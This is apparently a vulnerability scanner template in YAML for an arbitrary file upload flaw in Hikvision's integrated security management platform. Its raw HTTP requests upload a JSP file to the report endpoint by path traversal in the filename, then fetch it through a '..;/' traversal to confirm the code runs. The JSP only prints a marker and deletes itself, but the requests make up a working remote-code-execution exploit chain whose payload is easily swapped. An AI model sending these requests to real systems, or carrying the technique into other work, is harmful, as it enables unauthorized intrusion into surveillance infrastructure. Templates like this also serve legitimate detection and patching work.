id: hikvision-isecure-center-report-upload

info:
  name: hikvision-isecure-center-report-upload
  author: SleepingBag945
  severity: critical
  description: 海康威视综合安防管理平台任意文件上传
  reference:
    - https://github.com/zan8in/afrog/commit/641785d38b84ff3ea4c554e1c0620b3670358591
  tags: HIKVISION-综合安防管理平台

http:
  - raw:
      - |
        POST /svm/api/external/report HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
        Content-Length: 313

        ------WebKitFormBoundary9PggsiM755PLa54a
        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/{{randstr}}.jsp"
        Content-Type: application/zip

        <%out.println("Hello World");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

        ------WebKitFormBoundary9PggsiM755PLa54a--

      - |
        POST /svm/api/external/report HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
        Content-Length: 313

        ------WebKitFormBoundary9PggsiM755PLa54a
        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.2/webapps/eportal/{{randstr}}.jsp"
        Content-Type: application/zip

        <%out.println("Hello World");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

        ------WebKitFormBoundary9PggsiM755PLa54a--

      - |
        GET /portal/ui/login/..;/..;/{{randstr}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code_3==200"
          - "contains(body_3, 'Hello World')"
        condition: and
